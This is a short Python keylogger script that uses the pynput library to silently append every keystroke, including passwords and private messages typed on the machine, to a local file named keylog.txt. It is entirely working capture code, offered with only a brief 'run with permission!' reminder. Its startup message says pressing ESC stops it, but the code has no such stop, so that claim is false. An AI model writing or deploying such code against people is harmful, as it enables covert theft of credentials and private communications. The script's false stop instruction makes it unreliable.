from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key.name}] ")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Keylogger started. Press ESC to stop (run with permission!).")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()

